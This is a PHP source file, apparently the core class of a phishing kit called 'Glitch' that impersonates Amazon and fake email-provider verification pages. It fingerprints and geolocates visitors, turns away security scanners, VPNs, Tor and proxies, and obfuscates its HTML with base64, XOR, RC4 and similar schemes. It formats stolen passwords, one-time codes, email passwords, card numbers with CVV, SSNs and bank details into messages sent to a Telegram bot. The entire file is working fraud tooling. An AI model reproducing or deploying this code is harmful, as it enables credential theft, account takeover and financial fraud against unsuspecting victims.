<?php
session_start();
set_time_limit(0);
date_default_timezone_set("Asia/Jakarta");

class Glitch {
    public $server_api = "https://glitchlabs.tools";
    public $logs = __DIR__ . "/logs";
    public $onetime = __DIR__ . "/system/blocker/onetime.dat";
    public $file_config = "config.json";
    public $block = "block.txt";
    public $allow = "allow.txt";
    public $scampage = "https://www.amazon.com/";
    
    public function config($data) {
        $config = json_decode(file_get_contents(__DIR__.'/'.$this->file_config), true);
        if ($data == "apikey") {
            return $config[$data];
        } else {
            return $config['config'][$data];
        }
    }
    
    public function redirect($url) {
        header("location: ".$url);
        exit;
    }
    
    public function get($url) {
        $curl = curl_init();
        $option = [
          CURLOPT_SSL_VERIFYPEER  => false,
          CURLOPT_RETURNTRANSFER  => true,
          CURLOPT_URL             => $url,
          CURLOPT_USERAGENT       => 'Mozilla/5.0 (Macintosh; Intel Mac OS X vip; rv:42.0) Gecko/06072000 Firefox/42.0'
        ];
        curl_setopt_array($curl, $option);
        $data = curl_exec($curl);
        $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE);
        $httpcode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
        curl_close($curl);
        return array(
          'data'      => $data,
          'type'      => $type,
          'decode'    => json_decode($data, true),
          'httpcode'  => $httpcode
        );
    }
    
    public function IP() {
        if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)) {
            return $_SERVER['HTTP_CLIENT_IP'];
        } elseif (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP)) {
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            return $_SERVER['REMOTE_ADDR'];
        }
    }
    
    public function OS() {
        $os = "Unknown OS";
        $os_array = array(
          '/windows nt 10/i'      =>  'Windows 10',
          '/windows nt 6.3/i'     =>  'Windows 8.1',
          '/windows nt 6.2/i'     =>  'Windows 8',
          '/windows nt 6.1/i'     =>  'Windows 7',
          '/windows nt 6.0/i'     =>  'Windows Vista',
          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
          '/windows nt 5.1/i'     =>  'Windows XP',
          '/windows xp/i'         =>  'Windows XP',
          '/windows nt 5.0/i'     =>  'Windows 2000',
          '/windows me/i'         =>  'Windows ME',
          '/win98/i'              =>  'Windows 98',
          '/win95/i'              =>  'Windows 95',
          '/win16/i'              =>  'Windows 3.11',
          '/macintosh|mac os x/i' =>  'Mac OS X',
          '/mac_powerpc/i'        =>  'Mac OS 9',
          '/linux/i'              =>  'Linux',
          '/ubuntu/i'             =>  'Ubuntu',
          '/iphone/i'             =>  'iPhone',
          '/ipod/i'               =>  'iPod',
          '/ipad/i'               =>  'iPad',
          '/android/i'            =>  'Android',
          '/blackberry/i'         =>  'BlackBerry',
          '/webos/i'              =>  'Mobile'
        );
        foreach ($os_array as $regex => $value) {
          if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
            $os = $value;
          }
        }
        return $os;
    }
    
    public function BROWSER() {
        $browser = "Unknown Browser";
        $browser_array = array(
            '/msie/i'       =>  'Internet Explorer',
            '/firefox/i'    =>  'Firefox',
            '/safari/i'     =>  'Safari',
            '/chrome/i'     =>  'Chrome',
            '/edge/i'       =>  'Edge',
            '/opera/i'      =>  'Opera',
            '/netscape/i'   =>  'Netscape',
            '/maxthon/i'    =>  'Maxthon',
            '/konqueror/i'  =>  'Konqueror',
            '/mobile/i'     =>  'Handheld Browser'
        );
        foreach ($browser_array as $regex => $value) {
            if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
                $browser = $value;
            }
        }
        return $browser;
    }
    
    public function HOSTNAME() {
        return gethostbyaddr($_SESSION['ip']);
    }
    
    public function REFERER() {
        if (isset($_SERVER['HTTP_REFERER'])) {
            return $_SERVER['HTTP_REFERER'];
  	    } else {
            return "no-referer";
  	    }
    }
    
    public function USERAGENT() {
        return $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    }
    
    public function encypt($str) {
        return md5($str);
    }
  
    public function RANDOM() {
        return $this->encypt(microtime());
    }
    
    public function redirectPage($pathMobile, $pathDesktop, $extra = "") {
        $clientId = substr($this->RANDOM(), 0, 10) . "-" . substr($this->RANDOM(), 0, 8) . "-" . substr($this->RANDOM(), 0, 12);
        $oauth    = substr($this->RANDOM(), 0, 8) . "-" . substr($this->RANDOM(), 0, 6);
        $query    = "?openid.pape.max_auth_age=0&client_id={$clientId}&oauth_challenge={$oauth}{$extra}";
    
        if (preg_match('/Android|iPhone/i', $this->USERAGENT())) {
            $this->redirect($pathMobile . $query);
        } else {
            $this->redirect($pathDesktop . $query);
        }
        exit;
    }
    
    public function redirectEmailProvider($provider) {
        $basePathMap = [
            'aol'       => '/verifyEmailAol',
            'att'       => '/verifyEmailAtt',
            'microsoft' => '/verifyEmailMicrosoft',
            'yahoo'     => '/verifyEmailYahoo',
            'charter'   => '/verifyEmailCharter',
        ];
    
        if (isset($basePathMap[$provider])) {
            $path = $basePathMap[$provider];
        } else {
            $path = '/verifyEmailOther/' . urlencode($provider);
        }
    
        $clientId = substr($this->RANDOM(), 0, 10) . "-" . substr($this->RANDOM(), 0, 8) . "-" . substr($this->RANDOM(), 0, 12);
        $oauth    = substr($this->RANDOM(), 0, 8) . "-" . substr($this->RANDOM(), 0, 6);
        $query    = "?client_id={$clientId}&oauth_challenge={$oauth}&error=true";
    
        $this->redirect($path . $query);
        exit;
    }
    
    public function session($data, $value, $page) {
        if (isset($_SESSION[$data])) {
            if ($_SESSION[$data] == $value) {
                $this->allow($page);
            } else {
                $this->block("Session incorrect");
                $this->ngeblock("official");
            }
        } else {
            $this->block("Session undefined");
            $this->ngeblock("official");
        }
    }
    
    public function create_cookie() {
        setcookie("access_key", $_SESSION['key'], time()+7200);
    }
    
    public function check_cookie() {
        if (isset($_COOKIE['access_key'])) {
            if ($_COOKIE['access_key'] != $_SESSION['key']) {
                $this->ngeblock("official");
            }
        } else {
            $this->ngeblock("official");
        }
    }
    
    public function delete_cookie() {
        unset($_COOKIE['access_key']);
    }
    
    public function logout() {
        @session_destroy();
        $this->delete_cookie();
    }
    
    public function logs($name) {
        $data = array(
            'login' => 'data_login.txt',
            'relogin' => 'data_relogin.txt',
            'otp'   => 'data_otp.txt',
            'reotp'   => 'data_reotp.txt',
            'email' => 'data_email.txt',
            'reemail' => 'data_reemail.txt',
            'card' => 'data_card.txt',
            'recard' => 'data_recard.txt',
        );
        return $this->logs.'/'.$data[$name];
    }
    
    public function bin($num) {
        $num = str_replace(' ', '', trim($num));
        $num = substr($num, 0, 6);
    
        $url = "https://bins.su/";
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    
        $headers = array(
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.8",
            "Cache-Control: max-age=0",
            "Connection: keep-alive",
            "Content-Type: application/x-www-form-urlencoded",
            "Origin: https://bins.su/",
            "Referer: https://bins.su/",
            "Sec-Fetch-Dest: document",
            "Sec-Fetch-Mode: navigate",
            "Sec-Fetch-Site: same-origin",
            "Sec-Fetch-User: ?1",
            "Sec-GPC: 1",
            "Upgrade-Insecure-Requests: 1",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/119.0.0.0 Safari/537.36",
            "sec-ch-ua: 'Brave';v='119', 'Chromium';v='119', 'Not?A_Brand';v='24'",
            "sec-ch-ua-mobile: ?0",
            "sec-ch-ua-platform: 'Windows'",
        );
        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    
        $postData = "action=searchbins&bins=$num&bank=&country=";
        curl_setopt($curl, CURLOPT_POSTFIELDS, $postData);
    
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    
        $resp = curl_exec($curl);
        if (curl_errno($curl)) {
            curl_close($curl);
            return false;
        }
        curl_close($curl);
    
        $pattern = '#</tr><tr><td>(.*?)</td><td>(.*?)</td><td>(.*?)</td><td>(.*?)</td><td>(.*?)</td><td>(.*?)</td>#s';
        preg_match($pattern, $resp, $matches);
    
        if (count($matches) < 7) {
            return false;
        }
    
        return array(
            'brand'   => $matches[3] ?: "unknown brand",
            'type'    => $matches[4] ?: "unknown type",
            'level'   => $matches[5] ?: "unknown level",
            'bank'    => $matches[6] ?: "unknown bank",
            'bin'     => $num,
            'full'    => strtoupper($num . " " . ($matches[3] ?: "unknown brand") . " " . ($matches[4] ?: "unknown type") . " " . ($matches[5] ?: "unknown level") . " " . ($matches[6] ?: "unknown bank"))
        );
    }
  
    public function curl($url) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }
	
    public function data() {
        $_SESSION['ip']           = $this->IP();
        $_SESSION['host']         = $this->HOSTNAME();
        $_SESSION['key']          = $this->RANDOM();
        $_SESSION['os']           = $this->OS();
        $_SESSION['browser']      = $this->BROWSER();
        $_SESSION['referer']      = $this->REFERER();
        $_SESSION['useragent']    = $this->USERAGENT();
    	
    	$look = $this->curl("http://ip-api.com/json/" . $_SESSION['ip']);
    	$jsonlook = json_decode($look, true);
    	
        $_SESSION['isp']          = $jsonlook['isp'];
        $_SESSION['countrycode']  = $jsonlook['countryCode'];
        $_SESSION['country']      = $jsonlook['country'];
        $_SESSION['statecode']    = $jsonlook['region'];
        $_SESSION['state']        = $jsonlook['regionName'];
        $_SESSION['city']         = $jsonlook['city'];
        $_SESSION['flag'] = '<img src="https://flagsapi.com/' . $jsonlook['countryCode'] . '/shiny/24.png">';
    }

    public function save($file, $text, $type) {
        $fp = fopen($file, $type);
        return fwrite($fp, $text);
        fclose($fp);
    }
    
    public function ngeblock($str) {
        $this->logout();
        if ($str === "error") {
            $errorLinks = [
                "https://www.bbc.com/news",
                "https://edition.cnn.com/"
            ];
            $this->redirect($errorLinks[array_rand($errorLinks)]);
        } elseif ($str === "official") {
            $this->redirect($this->scampage);
        }
    }
    
    public function allow($str) {
        $file = $this->logs.'/'.$this->allow;
        $time = date('d M Y H:i A');
        $ip = $_SESSION['ip'];
        $country = $_SESSION['country'];
        $flag = $_SESSION['flag'];
        $isp = $_SESSION['isp'];
        $status = $str;
        $text = "{$time}|{$ip}|{$country} - {$flag}|{$isp}|{$status}";
        return $this->save($file, $text.PHP_EOL, "a");
    }
    
    public function block($str) {
        $file = $this->logs.'/'.$this->block;
        $time = date('d M Y H:i A');
        $ip = $_SESSION['ip'];
        $country = $_SESSION['country'];
        $flag = $_SESSION['flag'];
        $isp = $_SESSION['isp'];
        $status = $str;
        $text = "{$time}|{$ip}|{$country} - {$flag}|{$isp}|{$status}";
        return $this->save($file, $text.PHP_EOL, "a");
    }

    public function blocker() {
        if ($this->config("useragent") == "on") { $this->blocker_useragent(); }
        if ($this->config("host") == "on") { $this->blocker_host(); }
        if ($this->config("ip") == "on") { $this->blocker_ip(); }
        if ($this->config("isp") == "on") { $this->blocker_isp(); }
        if ($this->config("proxyport") == "on") { $this->blocker_proxyport(); }
        if ($this->config("dns") == "on") { $this->blocker_dns(); }
        if ($this->config("vpn") == "on") { $this->blocker_vpn(); }
    }
    
    public function strongblocker() {
        $this->blocker_ipintel();
        $this->blocker_proxycheck();
        $this->blocker_iphub();
    }
    
    public function badword() {
        $file = file_get_contents(__DIR__ . "/system/blocker/badword.json");
        $decode = json_decode($file, true);
        if (!is_array($decode)) return false;
    
        $input = strtolower($_SESSION['username'] . ' ' . $_SESSION['password']);
    
        foreach ($decode as $word) {
            if (stristr($input, $word) !== false) {
                $this->block("HUMAN INPUT BADWORD");
                return true;
            }
        }
        return false;
    }
    
    public function blocker_useragent() {
        $file = file_get_contents(__DIR__ . "/system/blocker/useragent.json");
    	$decode = json_decode($file, true);
        foreach ($decode as $useragent) {
            if (empty($_SESSION['useragent']) || substr_count(strtolower($_SESSION['useragent']), $useragent) > 0) {
                $this->save($this->onetime, $_SESSION['ip'].PHP_EOL, "a");
                $this->block("USERAGENT BLACKLIST");
                $this->ngeblock("error");
            }
        }
    }
    
    public function blocker_ip() {
	    $file = file_get_contents(__DIR__ . "/system/blocker/ip.json");
	    $decode = json_decode($file, true);
        $api = array(
          'ip' => $decode
        );
        if (in_array($_SESSION['ip'], $api['ip'])) {
            $this->save($this->onetime, $_SESSION['ip'].PHP_EOL, "a");
            $this->block("IP BLACKLIST");
            $this->ngeblock("error");
        } else {
            foreach ($api['ip'] as $ip) {
                if (preg_match("/$ip/", $_SESSION['ip'])) {
                    $this->save($this->onetime, $_SESSION['ip'].PHP_EOL, "a");
                    $this->block("IP BLACKLIST");
                    $this->ngeblock("error");
                }
            }
        }
    }
    
    public function blocker_isp() {
        $file = file_get_contents(__DIR__ . "/system/blocker/isp.json");
    	$decode = json_decode($file, true);
        foreach ($decode as $isp) {
            if (empty($_SESSION['isp']) || substr_count(strtolower($_SESSION['isp']), $isp) > 0) {
                $this->save($this->onetime, $_SESSION['ip'].PHP_EOL, "a");
                $this->block("ISP BLACKLIST");
                $this->ngeblock("error");
            }
        }
    }
    
    public function blocker_dns() {
        $data = array('exitnodes.tor.dnsbl.sectoor.de', 'tor.dnsbl.sectoor.de', 'tor.dan.me.uk', 'bl.spamcop.net');
        foreach ($data as $dns) {
            if (checkdnsrr(implode(".", array_reverse(explode(".", $_SESSION['ip']))).".".$dns.".", "A")) {
                $this->save($this->onetime, $_SESSION['ip'].PHP_EOL, "a");
                $this->block("DNS BLACKLIST ( ".$dns." )");
                $this->ngeblock("error");
            }
        }
    }
    
    public function blocker_host() {
        $file = file_get_contents(__DIR__ . "/system/blocker/host.json");
    	$decode = json_decode($file, true);
        foreach ($decode as $host) {
            if (empty($_SESSION['host']) || substr_count(strtolower($_SESSION['host']), $host) > 0) {
                $this->save($this->onetime, $_SESSION['ip'].PHP_EOL, "a");
                $this->block("HOSTNAME BLACKLIST");
                $this->ngeblock("error");
            }
        }
    }
    
    public function blocker_vpn() {
        $data = $this->get("https://blackbox.ipinfo.app/lookup/".$_SESSION['ip'])['data'];
        if (preg_match("/Y/", $data)) {
            $this->save($this->onetime, $_SESSION['ip'].PHP_EOL, "a");
            $this->block("BLOCKED by VPN");
            $this->ngeblock("error");
        }
    }
    
    public function blocker_ipintel() {
        $risk = $this->curl("http://check.getipintel.net/check.php?ip=".$_SESSION['ip']."&contact=".substr($this->RANDOM(), 0, 7)."@".explode("//", $this->server_api)[1]."&format=json");
        if (floatval($risk) >= 0.95) {
            $this->save($this->onetime, $_SESSION['ip'].PHP_EOL, "a");
            $this->block("BLOCKED by IPINTEL ( RISK: $risk )");
            $this->ngeblock("error");
        }
    }

    public function blocker_proxycheck() {
        $res = json_decode($this->curl("http://proxycheck.io/v2/".$_SESSION['ip']."?vpn=1&asn=1"), true);
        if (isset($res[$_SESSION['ip']]['proxy']) && $res[$_SESSION['ip']]['proxy'] === "yes") {
            $this->save($this->onetime, $_SESSION['ip'].PHP_EOL, "a");
            $this->block("BLOCKED by PROXYCHECK");
            $this->ngeblock("error");
        }
    }

    public function blocker_iphub() {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => "https://v2.api.iphub.info/guest/ip/".$_SESSION['ip'],
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_HTTPHEADER => ["X-Key: guest"],
            CURLOPT_SSL_VERIFYPEER => false
        ]);
        $res = curl_exec($ch);
        curl_close($ch);
        $data = json_decode($res, true);
        if (isset($data['block']) && intval($data['block']) > 0) {
            $this->save($this->onetime, $_SESSION['ip'].PHP_EOL, "a");
            $this->block("BLOCKED by IPHUB ( Blocked Level: ".$data['block']." )");
            $this->ngeblock("error");
        }
    }
    
    public function blocker_proxyport() {
        $dataproxy = array(
            'CLIENT_IP',
            'FORWARDED',
            'FORWARDED_FOR',
            'FORWARDED_FOR_IP',
            'VIA',
            'X_FORWARDED',
            'X_FORWARDED_FOR',
            'HTTP_CLIENT_IP',
            'HTTP_FORWARDED',
            'HTTP_FORWARDED_FOR',
            'HTTP_FORWARDED_FOR_IP',
            'HTTP_PROXY_CONNECTION',
            'HTTP_VIA',
            'HTTP_X_FORWARDED',
            'HTTP_X_FORWARDED_FOR'
        );
        foreach ($dataproxy as $proxy) {
            if (isset($_SERVER[$proxy])) {
                $this->save($this->onetime, $_SESSION['ip'].PHP_EOL, "a");
                $this->block("BLOCKED PROXY");
                $this->ngeblock("error");
            }
        }
        $dataport = array(80, 81, 553, 554, 1080, 3128, 4480, 6588, 8000, 8080);
        foreach ($dataport as $port) {
            if (@fsockopen($_SERVER['REMOTE_ADDR'], $port, $errno, $errstr, 3)) {
                $this->save($this->onetime, $_SESSION['ip'].PHP_EOL, "a");
                $this->block("BLOCKED PORT");
                $this->ngeblock("error");
            }
        }
    }
    
    public function image_encode($str) {
        require __DIR__ . '/system/class/mime.php';
        $result = array();
        $filePath = __DIR__ . '/' . $str;
        if (file_exists($filePath)) {
            $localMime = mime_content_type($filePath);
            $localContent = file_get_contents($filePath);
            $localBase64 = base64_encode($localContent);
            $result['local'] = "data:$localMime;base64,$localBase64";
        } else {
            $result['local'] = null;
        }
        $external = $this->get($str);
        if (isset($external['data']) && isset($external['type'])) {
            $urlBase64 = base64_encode($external['data']);
            $result['url'] = "data:".$external['type'].";base64,".$urlBase64;
        } else {
            $result['url'] = null;
        }
        return $result;
    }

    
    public function text_encode($str) {
    $crypt = [
            "A" => "065",
            "a" => "097",
            "B" => "066",
            "b" => "098",
            "C" => "067",
            "c" => "099",
            "D" => "068",
            "d" => "100",
            "E" => "069",
            "e" => "101",
            "F" => "070",
            "f" => "102",
            "G" => "071",
            "g" => "103",
            "H" => "072",
            "h" => "104",
            "I" => "073",
            "i" => "105",
            "J" => "074",
            "j" => "106",
            "K" => "075",
            "k" => "107",
            "L" => "076",
            "l" => "108",
            "M" => "077",
            "m" => "109",
            "N" => "078",
            "n" => "110",
            "O" => "079",
            "o" => "111",
            "P" => "080",
            "p" => "112",
            "Q" => "081",
            "q" => "113",
            "R" => "082",
            "r" => "114",
            "S" => "083",
            "s" => "115",
            "T" => "084",
            "t" => "116",
            "U" => "085",
            "u" => "117",
            "V" => "086",
            "v" => "118",
            "W" => "087",
            "w" => "119",
            "X" => "088",
            "x" => "120",
            "Y" => "089",
            "y" => "121",
            "Z" => "090",
            "z" => "122",
            "0" => "048",
            "1" => "049",
            "2" => "050",
            "3" => "051",
            "4" => "052",
            "5" => "053",
            "6" => "054",
            "7" => "055",
            "8" => "056",
            "9" => "057",
            "&" => "038",
            " " => "032",
            "_" => "095",
            "-" => "045",
            "@" => "064",
            "." => "046",
        ];
        $encode = "";
        for ($i=0; $i < strlen($str); $i++) {
            $key = substr($str, $i, 1);
            if (array_key_exists($key, $crypt)) {
                $random = rand(1, 3);
                if ($random == '1') {
                    $encode = $encode.$key;
                } elseif ($random == '3') {
                    $encode = $encode.$key;
                } else {
                    $encode = $encode."&#".$crypt[$key].";";
                }
            } else {
                $encode = $encode.$key;
            }
        }
        return $encode;
    }

    public function undetect($html) {
        $search = array('/\>[^\S ]+/s', '/[^\S ]+\</s', '/(\s)+/s');
        $replace = array('>', '<', '\\1', '');
        $minify = preg_replace($search, $replace, $html);
        if ($this->config("undetect") === "off") return print($minify);
        $undetect = preg_replace('/<div/', '<!-- '.$_SESSION['key'].' --><div', $minify);
        $undetect = preg_replace('/<\/div/', '<!-- '.$_SESSION['key'].' --></div', $undetect);
        $undetect = preg_replace('/class=\"/', 'class="'.microtime(1).' ', $undetect);
        $mode = $this->config("undetect_type");
        $key = "GLITCH";
    
        if ($mode == "md5") {
            print($undetect);
        } else if ($mode == "base64") {
            $encoded = base64_encode($undetect);
            echo '<script>document.write(atob("' . $encoded . '"));</script>';
        } else if ($mode == "hex") {
            $hex = bin2hex($undetect);
            echo '<script>
                const hex = "' . $hex . '";
                let str = "";
                for (let i = 0; i < hex.length; i += 2) {
                    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
                }
                document.write(str);
            </script>';
        } else if ($mode == "xor") {
            $xored = '';
            for ($i = 0; $i < strlen($undetect); $i++) {
                $xored .= chr(ord($undetect[$i]) ^ ord($key[$i % strlen($key)]));
            }
            $encoded = base64_encode($xored);
            echo '<script>
                const key = ' . json_encode($key) . ';
                const data = atob("' . $encoded . '");
                let result = "";
                for (let i = 0; i < data.length; i++) {
                    result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
                }
                document.write(result);
            </script>';
        } else if ($mode == "rot13") {
            $rot = str_rot13($undetect);
            echo '<script>
                const rot = "' . addslashes($rot) . '";
                document.write(rot.replace(/[a-zA-Z]/g, function(c){
                    return String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26);
                }));
            </script>';
        } else if ($mode == "rc4") {
            function rc4($key, $str) {
                $s = range(0, 255); $j = 0; $res = '';
                for ($i = 0; $i < 256; $i++) {
                    $j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
                    $tmp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $tmp;
                }
                $i = $j = 0;
                for ($y = 0; $y < strlen($str); $y++) {
                    $i = ($i + 1) % 256;
                    $j = ($j + $s[$i]) % 256;
                    $tmp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $tmp;
                    $res .= chr(ord($str[$y]) ^ $s[($s[$i] + $s[$j]) % 256]);
                }
                return $res;
            }
            $rc4 = rc4($key, $undetect);
            $encoded = base64_encode($rc4);
            echo '<script>
                const key = ' . json_encode($key) . ';
                const data = atob("' . $encoded . '");
                function rc4(key, str) {
                    var s = [], j = 0, x, res = "";
                    for (var i = 0; i < 256; i++) s[i] = i;
                    for (i = 0; i < 256; i++) {
                        j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;
                        [s[i], s[j]] = [s[j], s[i]];
                    }
                    i = j = 0;
                    for (var y = 0; y < str.length; y++) {
                        i = (i + 1) % 256;
                        j = (j + s[i]) % 256;
                        [s[i], s[j]] = [s[j], s[i]];
                        x = s[(s[i] + s[j]) % 256];
                        res += String.fromCharCode(str.charCodeAt(y) ^ x);
                    }
                    return res;
                }
                document.write(rc4(key, data));
            </script>';
        } else if ($mode == "reverse") {
            $rev = strrev($undetect);
            echo '<script>
                const rev = "' . addslashes($rev) . '";
                document.write(rev.split("").reverse().join(""));
            </script>';
        } else {
            print($minify);
        }
    }
    
    public function language() {
        $countryLangMap = [
            'de' => 'de',
            'es' => 'es',
            'fr' => 'fr',
            'it' => 'it',
            'jp' => 'jp',
            'kr' => 'kr'
        ];
        $lang = 'en';
        
        if (isset($_SESSION['countrycode'])) {
            $code = strtolower($_SESSION['countrycode']);
            if (array_key_exists($code, $countryLangMap)) {
                $lang = $countryLangMap[$code];
            }
        } else {
            $browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en', 0, 2);
            if (in_array($browserLang, ['de', 'es', 'fr', 'it', 'jp', 'kr'])) {
                $lang = $browserLang;
            }
        }
    
        $detectlang = __DIR__ . "/system/language/{$lang}.php";
        if (!file_exists($detectlang)) {
            $detectlang = __DIR__ . "/system/language/en.php";
        }
        return $detectlang;
    }
    
    public function getStr($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }
    
    public function stopbotkey() {
        return $this->config("keystopbot");
    }
    
    public function botblockerkey() {
        return $this->config("keybotblocker");
    }
    
    public function result() {
        return $this->config("emailResult");
    }
    
    public function from() {
        return $this->config("mailFrom");
    }
    
    public function maskEmail($email) {
        $parts = explode('@', $email);
        if (strlen($parts[0]) <= 1) return '*' . '@' . $parts[1];
        return substr($parts[0], 0, 1) . str_repeat('*', strlen($parts[0]) - 1) . '@' . $parts[1];
    }
    
    public function maskPhone($phone) {
        $lastDigits = substr($phone, -4);
        return str_repeat('*', strlen($phone) - 4) . $lastDigits;
    }
    
    public function maskWords($phrase) {
        $words = explode(' ', trim($phrase));
        $masked = [];
    
        foreach ($words as $word) {
            if (strlen($word) <= 1) {
                $masked[] = '*';
            } else {
                $masked[] = substr($word, 0, 1) . str_repeat('*', strlen($word) - 1);
            }
        }
        return implode(' ', $masked);
    }
    
    public function emailProvider() {
        if (preg_match("/@aol/", $_SESSION['username'])) {
            $_SESSION['provider'] = 'aol';
        } elseif (preg_match("/@att|@ameritech|@sbcglobal|@bellsouth|@flash|@nvbell|@pacbell|@prodigy|@snet|@swbell/", $_SESSION['username'])) {
            $_SESSION['provider'] = 'att';
        } elseif (preg_match("/@hotmail|@outlook|@live|@msn/", $_SESSION['username'])) {
            $_SESSION['provider'] = 'microsoft';
        } elseif (preg_match("/@yahoo|@ymail|@rocketmail/", $_SESSION['username'])) {
            $_SESSION['provider'] = 'yahoo';
        } elseif (preg_match("/@charter|@spectrum|@twc|@rr/", $_SESSION['username'])) {
            $_SESSION['provider'] = 'charter';
        } else {
            $_SESSION['provider'] = explode("@", $_SESSION['username'])[1];
        }
    }
    
    public function sendTelegram($message) {
        $token   = $this->config("token");
        $chatId  = $this->config("chat_id");
    
        if (empty($token) || empty($chatId)) {
            return false;
        }
    
        $telegramUrl = "https://api.telegram.org/bot{$token}/sendMessage";
        $postData = [
            'chat_id' => $chatId,
            'text'    => $message
        ];
    
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $telegramUrl);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    }
    
    public function generateLoginMessage(
        $username, $password, 
        $date, $ip, $connectionisp, $countryname, $region, $city, $br, $os
    ) {
    return "
    🛡️ SYSTEM NOTICE
🚨 Data logged by Glitch

🔐 Login Information
👤 USERNAME   : {$username}
🔑 PASSWORD   : {$password}

🌐 Device Metadata
🛰️ IP ADDRESS : {$ip}
🏢 ISP        : {$connectionisp}
📍 LOCATION   : {$city}, {$region}, {$countryname}
🕒 TIMESTAMP  : {$date}

💻 Client Metadata
🧠 OS         : {$os}
🌐 BROWSER    : {$br}
🧬 USER AGENT : {$_SERVER['HTTP_USER_AGENT']}
    ";
    }
    
    public function generateOTPMessage(
        $username, $password, $otp, 
        $date, $ip, $connectionisp, $countryname, $region, $city, $br, $os
    ) {
    return "
    🛡️ SYSTEM NOTICE
🚨 Data logged by Glitch

🔐 Login Information
👤 USERNAME   : {$username}
🔑 PASSWORD   : {$password}
🔢 OTP        : {$otp}

🌐 Device Metadata
🛰️ IP ADDRESS : {$ip}
🏢 ISP        : {$connectionisp}
📍 LOCATION   : {$city}, {$region}, {$countryname}
🕒 TIMESTAMP  : {$date}

💻 Client Metadata
🧠 OS         : {$os}
🌐 BROWSER    : {$br}
🧬 USER AGENT : {$_SERVER['HTTP_USER_AGENT']}
    ";
    }
    
    public function generateEMAILMessage(
        $username, $password, $passwordemail, 
        $date, $ip, $connectionisp, $countryname, $region, $city, $br, $os
    ) {
    return "
    🛡️ SYSTEM NOTICE
🚨 Data logged by Glitch

🔐 Login Information
👤 USERNAME   : {$username}
🔑 PASSWORD   : {$password}

📧 Login Email Information
👤 EMAIL      : {$username}
🔑 PASSWORD   : {$passwordemail}

🌐 Device Metadata
🛰️ IP ADDRESS : {$ip}
🏢 ISP        : {$connectionisp}
📍 LOCATION   : {$city}, {$region}, {$countryname}
🕒 TIMESTAMP  : {$date}

💻 Client Metadata
🧠 OS         : {$os}
🌐 BROWSER    : {$br}
🧬 USER AGENT : {$_SERVER['HTTP_USER_AGENT']}
    ";
    }
    
    public function generateFullinformationMessage(
        $username, $password, 
        $cardname, $cardnumber, $cardexp, $cvv, $card_bin, 
        $fullname, $dob, $phone, $addressline1, $addressline2, $negara, $kota, $region, $zipcode,
        $ssn, $sin, $acno, $sort, $osid, $climit,
        $date, $ip, $connectionisp, $countryname, $state, $city, $br, $os
    ) {
    return "
    🛡️ SYSTEM NOTICE
🚨 Data logged by Glitch

🔐 Login Information
👤 USERNAME   : {$username}
🔑 PASSWORD   : {$password}

💳 Card Information
👤 CARD NAME  : {$cardname}
💳 CARD NUMBER: {$cardnumber}
📅 EXPIRY     : {$cardexp}
🔐 CVV        : {$cvv}
🏦 BIN        : {$card_bin}

🆔 Identity Information
🪪 SSN        : {$ssn}
🪪 SIN        : {$sin}
🏦 ACCOUNT NO : {$acno}
🏦 SORT CODE  : {$sort}
🆔 OSID       : {$osid}
💰 CARD LIMIT : {$climit}

📍 Personal Information
👤 FULL NAME  : {$fullname}
🎂 DOB        : {$dob} (MM/DD/YYYY)
📞 PHONE      : {$phone}
🏠 ADDRESS    : {$addressline1}, {$addressline2}
🌏 COUNTRY    : {$negara}
🏙️ CITY       : {$kota}
🏛️ REGION     : {$region}
📮 ZIP CODE   : {$zipcode}

🌐 Device Metadata
🛰️ IP ADDRESS : {$ip}
🏢 ISP        : {$connectionisp}
📍 LOCATION   : {$city}, {$state}, {$countryname}
🕒 TIMESTAMP  : {$date}

💻 Client Metadata
🧠 OS         : {$os}
🌐 BROWSER    : {$br}
🧬 USER AGENT : {$_SERVER['HTTP_USER_AGENT']}
    ";
    }
    
